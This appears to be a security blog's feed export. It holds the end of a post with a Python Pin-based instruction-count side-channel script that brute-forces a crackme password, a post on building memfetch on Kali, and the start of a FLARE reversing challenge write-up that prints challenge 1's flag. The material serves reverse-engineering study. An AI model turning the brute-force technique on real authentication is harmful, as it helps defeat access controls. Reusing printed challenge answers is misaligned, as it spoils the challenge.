</span><span class="line"><span class="err">0</span><span class="nf">xb7f843ed</span> <span class="o">&lt;+</span><span class="mi">6253</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">test</span>   <span class="nb">cl</span><span class="p">,</span><span class="nb">cl</span>  <span class="c1">; if (code[1] == 0) goto 0xb7f843c3; // have we reached the end of code?</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843ef</span> <span class="o">&lt;+</span><span class="mi">6255</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0xb7f843c3</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6211</span><span class="o">&gt;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843f1</span> <span class="o">&lt;+</span><span class="mi">6257</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">ebp</span><span class="p">,</span><span class="mh">0x2</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843f4</span> <span class="o">&lt;+</span><span class="mi">6260</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0xb7f843c3</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6211</span><span class="o">&gt;</span>
</span><span class="line"><span class="nf">...</span>
</span><span class="line"><span class="c1">; similar byte compares until the end</span>
</span><span class="line"><span class="nf">...</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f8453f</span> <span class="o">&lt;+</span><span class="mi">6591</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">test</span>   <span class="nb">cl</span><span class="p">,</span><span class="nb">cl</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f84541</span> <span class="o">&lt;+</span><span class="mi">6593</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0xb7f843c3</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">621</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f84547</span> <span class="o">&lt;+</span><span class="mi">6599</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">ebp</span><span class="p">,</span><span class="mh">0xf</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f8454a</span> <span class="o">&lt;+</span><span class="mi">6602</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0xb7f843c3</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">621</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f84550</span> <span class="o">&lt;+</span><span class="mi">6608</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movzx</span>  <span class="nb">ecx</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mh">0xf</span><span class="p">]</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f84554</span> <span class="o">&lt;+</span><span class="mi">6612</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mh">0xf</span><span class="p">],</span><span class="nb">cl</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f84557</span> <span class="o">&lt;+</span><span class="mi">6615</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0xb7f843b0</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">619</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f8455d</span> <span class="o">&lt;+</span><span class="mi">6621</span><span class="o">&gt;</span><span class="c1">;	test   cl,cl</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We can see that the implementation has unrolled the for and compares 16 bytes one by one. If a character is correct, two more instructions are executed (as we saw) which are <code>test   cl,cl</code> and <code>je     0xb7f843c3</code> which basically checks if we have reached the end of first string. Now we know why. Let us build our tool.</p>

<h3 id="pinsolver-mk1">PinSolver Mk1</h3>
<p>I am going to use Python’s subprocess module and reuse <a href="http://parsiya.net/blog/2014-05-25-pasting-shellcode-into-gdb-using-python/">some old code</a>. The script simply iterates through all valid characters (note: do not include space or some other special characters). For this example I am going to use alphanumeric characters. Character with the largest number of executed instructions will be chose and we move on to the next character.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/python</span>
</span><span class="line">
</span><span class="line"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span><span class="p">,</span> <span class="n">PIPE</span>
</span><span class="line">
</span><span class="line"><span class="c"># create a set of alphanumeric chars</span>
</span><span class="line"><span class="n">alphanumeric</span> <span class="o">=</span> <span class="s">&quot;0123456789&quot;</span> <span class="o">+</span> <span class="s">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span> <span class="o">+</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>
</span><span class="line">
</span><span class="line"><span class="n">solution</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class="line">
</span><span class="line"><span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class="line">
</span><span class="line"><span class="k">while</span> <span class="p">(</span><span class="bp">True</span><span class="p">):</span>
</span><span class="line">
</span><span class="line">  <span class="n">maxcount</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class="line">  <span class="n">candidate_char</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class="line">
</span><span class="line">  <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">alphanumeric</span><span class="p">:</span>
</span><span class="line">    <span class="c"># construct</span>
</span><span class="line">    <span class="n">fez</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">solution</span><span class="p">)</span> <span class="o">+</span> <span class="n">char</span>
</span><span class="line">    <span class="n">proc</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">([</span><span class="s">&quot;pin&quot;</span><span class="p">,</span> <span class="s">&quot;-t&quot;</span><span class="p">,</span> <span class="s">&quot;myins.so&quot;</span><span class="p">,</span> <span class="s">&quot;--&quot;</span><span class="p">,</span><span class="s">&quot;./crkme1&quot;</span><span class="p">,</span> <span class="n">fez</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">    <span class="c"># read output and split by lines</span>
</span><span class="line">    <span class="n">output</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span><span class="line">
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;Correct&quot;</span><span class="p">):</span>
</span><span class="line">      <span class="k">print</span> <span class="s">&quot;Code found: &quot;</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">solution</span><span class="p">)</span>
</span><span class="line">      <span class="k">break</span>
</span><span class="line">    <span class="k">else</span><span class="p">:</span>
</span><span class="line">      <span class="n">count</span> <span class="o">=</span> <span class="nb">int</span> <span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
</span><span class="line">
</span><span class="line">      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">maxcount</span><span class="p">):</span>
</span><span class="line">        <span class="n">maxcount</span> <span class="o">=</span> <span class="n">count</span>
</span><span class="line">        <span class="n">candidate_char</span> <span class="o">=</span> <span class="n">char</span>
</span><span class="line">
</span><span class="line">    <span class="c"># print (&quot;Trying %s - Count is: %d - Maxcount is: %d - Candidate_char is: %s&quot;) % (fez, count, maxcount, candidate_char)</span>
</span><span class="line">
</span><span class="line">  <span class="c"># after a loop has finished, add the chosen char to the solution</span>
</span><span class="line">  <span class="n">solution</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">candidate_char</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Note: If your VM has multiple CPUs this will not work. At this moment I do not know why.</p>

<p>TODO in next chapter:</p>

<ol>
  <li>Try to find some simple crackmes2 from CTFs to run this tool on</li>
  <li>Find a way to increase pin’s performance</li>
  <li>Why is the instruction count not calculated correctly occasionally when VM has multiple CPUs?</li>
</ol>

<p>As usual, if there is a any feedback please feel free to comment or contact me on Twitter. My handle is in the side bar —-&gt;.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building Memfetch on Kali + Comments]]></title>
    <link href="http://parsiya.net/blog/2014-11-18-building-memfetch-on-kali/"/>
    <updated>2014-11-18T23:21:01-05:00</updated>
    <id>http://parsiya.net/blog/building-memfetch-on-kali</id>
    <content type="html"><![CDATA[<p>I’ve used Disqus to add comments. At the moment, guests can comment and comments do not need to be approved (unless they have links). Hopefully there won’t be much spam to sink the ocassional comment that I think will be posted.</p>

<p>Note: I just wanted to make it work in a hurry. There are probably better ways of doing this.</p>

<p>I stumbled upon the very useful tool <a href="http://lcamtuf.coredump.cx/soft/memfetch.tgz">memfetch</a> by the talented <em>lcamtuf</em>. The utility is quite old (from 2003 if I recall correctly) and I could not build it using the provided makefile.</p>

<!-- more -->

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>make
</span><span class="line">gcc -Wall -O9    memfetch.c   -o memfetch
</span><span class="line">memfetch.c:30:22: fatal error: asm/page.h: No such file or directory
</span><span class="line">compilation terminated.
</span><span class="line">make: *** <span class="o">[</span>memfetch<span class="o">]</span> Error 1
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Seems like the location of header files have moved since then. <a href="http://stackoverflow.com/a/19310710">This stackoverflow answer</a> mentions removing <code>asm/page.h</code> and adding <code>linux/types.h</code>. Let’s see what happens now:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>make
</span><span class="line">gcc -Wall -O9    memfetch.c   -o memfetch
</span><span class="line">memfetch.c: In <span class="k">function</span> ‘main’:
</span><span class="line">memfetch.c:284:25: error: ‘PAGE_SIZE’ undeclared <span class="o">(</span>first use in this <span class="k">function</span><span class="o">)</span>
</span><span class="line">memfetch.c:284:25: note: each undeclared identifier is reported only once <span class="k">for </span>each <span class="k">function </span>it appears in
</span><span class="line">make: *** <span class="o">[</span>memfetch<span class="o">]</span> Error 1
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The <code>page.h</code> file is located at <code>/usr/src/linux-headers-3.12-kali1-common/include/asm-generic/page.h</code> on Kali linux. This is where <code>PAGE_SIZE</code> is defined. Just adding it to <code>memfetch.c</code> along with changing <code>#include &lt;asm/page.h&gt;</code> to <code>#include &lt;linux/types.h&gt;</code> will do the trick.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class=""><span class="line">// #include &lt;asm/page.h&gt;
</span><span class="line">#include &lt;linux/types.h&gt;
</span><span class="line">
</span><span class="line">// Copied from asm-generic/page.h
</span><span class="line">/* PAGE_SHIFT determines the page size */
</span><span class="line">#define PAGE_SHIFT	12
</span><span class="line">#ifdef __ASSEMBLY__
</span><span class="line">#define PAGE_SIZE	(1 &lt;&lt; PAGE_SHIFT)
</span><span class="line">#else
</span><span class="line">#define PAGE_SIZE	(1UL &lt;&lt; PAGE_SHIFT)
</span><span class="line">#endif
</span><span class="line">#define PAGE_MASK	(~(PAGE_SIZE-1))</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>If there is a better way to make this work, please let me know.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Adventure With Fireeye FLARE Challenge]]></title>
    <link href="http://parsiya.net/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/"/>
    <updated>2014-10-07T02:31:44-04:00</updated>
    <id>http://parsiya.net/blog/my-adventure-with-fireeye-flare-challenge</id>
    <content type="html"><![CDATA[<p>These are my (rather long) solutions to Fireeye’s FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.</p>

<p>If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.</p>

<p>I am a bit late to the party. There <del>were two</del> are now other three solutions posted (that I know of). Check them out.</p>

<ul>
  <li><a href="https://www.codeandsec.com/Detailed-Solutions-to-FireEye-FLARE-Challenge">Detailed Solutions to FireEye FLARE Challenge</a></li>
  <li><a href="http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html">A Walk through for FLARE RE Challenges</a></li>
  <li>The FLARE On Challenge Solutions by Fireye
    <ul>
      <li><a href="http://www.fireeye.com/blog/technical/cyber-exploits/2014/11/the-flare-on-challenge-solutions-part-1-of-2.html">Part 1 - solutions for challenges 1 to 5</a></li>
      <li><a href="https://www.fireeye.com/blog/threat-research/2014/11/flare_on_challengep.html">Part 2 - solutions for challenges 6 and 7</a></li>
    </ul>
  </li>
</ul>

<!-- more -->

<h3 id="links-to-individual-challenges">Links to Individual Challenges</h3>
<p>This post is quite long (I didn’t want to strip them into different posts), use the following links to jump to any specific challenge:</p>

<ul>
  <li><a href="#ch1">Challenge 1</a></li>
  <li><a href="#ch2">Challenge 2</a></li>
  <li><a href="#ch3">Challenge 3</a></li>
  <li><a href="#ch4">Challenge 4</a></li>
  <li><a href="#ch5">Challenge 5</a></li>
  <li><a href="#ch6">Challenge 6</a></li>
  <li><a href="#ch7">Challenge 7</a></li>
</ul>

<h3 id="my-setup">My Setup</h3>
<p>I used a Windows XP SP3 Virtual Machine for most challenges using VirtualBox. For challenge 6 I used a Kali 64-bit VM. I used IDA/Immunity on my host OS with some other utilities.</p>

<h3 id="helpful-tools">Helpful Tools</h3>
<ul>
  <li><a href="http://www.7-zip.org/download.html">7-zip</a></li>
  <li><a href="http://www.winitor.com/">PE-Studio</a>: Gain information about the binary <strong>without running it.</strong> It also sends a hash (MD5 I think) of the file to Virustotal so if you want to keep your samples secret, don’t give it internet access</li>
  <li><a href="http://www.jetbrains.com/decompiler/">dotPeek</a>: Free .NET decompiler by JetBrains</li>
  <li><a href="http://www.red-gate.com/products/dotnet-development/reflector/">.NET Reflector</a>: .NET decompiler. Not free but comes with a 2-week trial period</li>
  <li><a href="http://mh-nexus.de/en/downloads.php?product=HxD">HxD</a>: Free Windows hex editor</li>
  <li><a href="http://notepad-plus-plus.org/">Notepad++</a>: Slick FOSS text-editor</li>
  <li><a href="http://debugger.immunityinc.com/ID_register.py">Immunity Debugger</a>: Windows debugger. Very similar to <a href="http://www.ollydbg.de/">OllyDbg</a></li>
  <li><a href="https://code.google.com/p/pyew/">pyew</a>: A Python tool for static malware analysis. I used it for PDF analysis</li>
  <li><a href="https://www.hex-rays.com/products/ida/">IDA</a>: What can I say? It’s great but also costs an arm and a leg. Except challenge 6, the trial and free version are enough for us</li>
  <li><a href="http://home.gna.org/bless/">Bless</a>: Linux Hex editor</li>
  <li><a href="http://www.rohitab.com/apimonitor">API Monitor</a>: Free utility to monitor API calls in Windows. It can monitor calls for standard windows APIs or we can add application-specific Dlls and monitor them</li>
  <li><a href="https://www.wireshark.org/download.html">Wireshark</a>: FOSS network monitoring/capturing tool. Needs administrator access on Windows to install libpcap</li>
  <li><a href="http://www.microsoft.com/en-us/download/details.aspx?id=4865">Microsoft Network Monitor</a>: Microsoft network monitoring/capturing tool. Does not need administrator access. Replaced by <a href="http://www.microsoft.com/en-us/download/details.aspx?id=40308">Microsoft Message Analyzer</a></li>
</ul>

<hr />

<h2 id="a-namech1a-challenge-1---bob-roge"><a name="ch1"></a> Challenge 1 - Bob Roge</h2>
<p>The challenge starts with going to their website at <a href="http://flare-on.com">http://flare-on.com</a> and downloading a binary. The binary is a self-extracting zip file which is supposed to show you the challenge EULA. It didn’t work on my VM.</p>

<p><img src="http://parsiya.net/images/2014/flare/1-1.jpg" alt="Self-Extracting zip failed :(" title="Self-Extracting zip failed :(" /></p>

<p>I opened it with <code>7-zip</code> to get <code>Challenge1.exe</code>. By dropping it into <code>PE-Studio</code> I gained more information:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>PE-Studio info </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class=""><span class="line">The Image is a fake Microsoft executable    # Company name is Microsoft but it is not signed?
</span><span class="line">The Manifest Identity name (MyApplication.app) is different than the Image name
</span><span class="line">The Version Information 'OriginalFilename' (rev_challenge_1.exe) is different than the Image name
</span><span class="line">The Debug Symbol File Name () is different than the Image name (challenge1)
</span><span class="line">The image is Managed (.NET)</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>So it appears to be a .Net binary. Let’s run it.</p>

<p><img src="http://parsiya.net/images/2014/flare/1-2.jpg" alt="Challenge 1 executed" title="Challenge 1 executed" /></p>

<p>Hey I love this guy. Let’s press <code>DECODE.</code></p>

<p><img src="http://parsiya.net/images/2014/flare/1-3.jpg" alt="Much decode" title="Much decode" /></p>

<p>Look at that garbled data. We can decompile it (remember it’s a .Net binary). Using <code>dotPeek</code> we can see the code for <code>Decode</code> button:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>btnDecode_click </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
</pre></td><td class="code"><pre><code class="c#"><span class="line"><span class="k">private</span> <span class="k">void</span> <span class="nf">btnDecode_Click</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="k">this</span><span class="p">.</span><span class="n">pbRoge</span><span class="p">.</span><span class="n">Image</span> <span class="p">=</span> <span class="p">(</span><span class="n">Image</span><span class="p">)</span> <span class="n">Resources</span><span class="p">.</span><span class="n">bob_roge</span><span class="p">;</span> <span class="c1">// change the image</span>
</span><span class="line">  <span class="kt">byte</span><span class="p">[]</span> <span class="n">datSecret</span> <span class="p">=</span> <span class="n">Resources</span><span class="p">.</span><span class="n">dat_secret</span><span class="p">;</span>        <span class="c1">// interesting</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&lt;</span> <span class="n">datSecret</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
</span><span class="line">  <span class="p">{</span>
</span><span class="line">	<span class="kt">byte</span> <span class="n">num</span> <span class="p">=</span> <span class="n">datSecret</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
</span><span class="line">	<span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span> <span class="n">num</span> <span class="p">&gt;&gt;</span> <span class="m">4</span> <span class="p">|</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">num</span> <span class="p">&lt;&lt;</span> <span class="m">4</span> <span class="p">&amp;</span> <span class="m">240</span><span class="p">)</span> <span class="p">^</span> <span class="m">41</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="s">&quot;\0&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str3</span> <span class="p">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="kt">int</span> <span class="n">index1</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
</span><span class="line">  <span class="k">while</span> <span class="p">(</span><span class="n">index1</span> <span class="p">&lt;</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span><span class="line">  <span class="p">{</span>
</span><span class="line">	<span class="n">str3</span> <span class="p">=</span> <span class="n">str3</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index1</span> <span class="p">+</span> <span class="m">1</span><span class="p">]</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index1</span><span class="p">];</span>
</span><span class="line">	<span class="n">index1</span> <span class="p">+=</span> <span class="m">2</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str4</span> <span class="p">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index2</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index2</span> <span class="p">&lt;</span> <span class="n">str3</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index2</span><span class="p">)</span>
</span><span class="line">  <span class="p">{</span>
</span><span class="line">	<span class="kt">int</span> <span class="n">num</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">str3</span><span class="p">[</span><span class="n">index2</span><span class="p">];</span>
</span><span class="line">	<span class="n">str4</span> <span class="p">=</span> <span class="n">str4</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)</span> <span class="n">str3</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="p">^</span> <span class="m">102</span><span class="n">U</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">this</span><span class="p">.</span><span class="n">lbl_title</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="n">str4</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Line 4 reads <code>dat_secret</code> and the rest of the function manipulates it before displaying it on the form. To save this file expand <code>resources</code> and select <code>rev_challenge_1.dat_secret.encode</code>. Right click and select <code>Save Resource to File.</code></p>

<p><img src="http://parsiya.net/images/2014/flare/1-4.jpg" alt="Saving private secret" title="Saving private secret" /> </p>

<p>I used <code>HxD</code> to look at the contents.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Contents of dat_secret </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">A1 B5 44 84 14 E4 A1 B5 D4 70 B4 91 B4 70 D4 91 E4 C4 96 F4 54 84 B5 C4 40 64 74 70 A4 64 44
</span><span class="line">¡µD„.ä¡µÔp´‘´pÔ‘äÄ–ôT„µÄ@dtp¤dD</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Let’s run the code with <code>dat_secret</code> and print the result after each level (i.e. <code>str2, str3 and str4</code>). One option is to use the provided C# code. I re-wrote the code in Python and ran it online using <a href="http://repl.it/languages">repl.it</a>. Str1 is the answer so we don’t care about the rest:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Decoding dat_secret </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
</span><span class="line">
</span><span class="line"><span class="n">datsecret</span> <span class="o">=</span> <span class="n">unhexlify</span> <span class="p">(</span><span class="s">&quot;A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444&quot;</span><span class="p">)</span>
</span><span class="line"><span class="n">str1</span><span class="o">=</span><span class="s">&quot;&quot;</span>
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">datsecret</span><span class="p">:</span>
</span><span class="line">    <span class="n">num</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>
</span><span class="line">    <span class="n">str1</span> <span class="o">+=</span>  <span class="nb">chr</span><span class="p">(</span> <span class="p">(</span> <span class="n">num</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">num</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">240</span><span class="p">)</span> <span class="o">^</span> <span class="mi">41</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">str1</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 1 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">3rmahg3rd.b0b.d0ge@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>

<hr />

<h2 id="a-namech2a-challenge-2---a-study-in-javascript"><a name="ch2"></a> Challenge 2 - A Study in JavaScript</h2>
<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class=""><span class="line">Well done! Looks like you kicked that one. I've attached the next challenge for your reversing pleasure. The password to this zip archive is "malware".
</span><span class="line">We saw what looked like attacker activity to this site, can you figure out what the attackers changed?
</span><span class="line">Hopefully you'll knock this one out too, Good luck!
</span><span class="line">
</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>
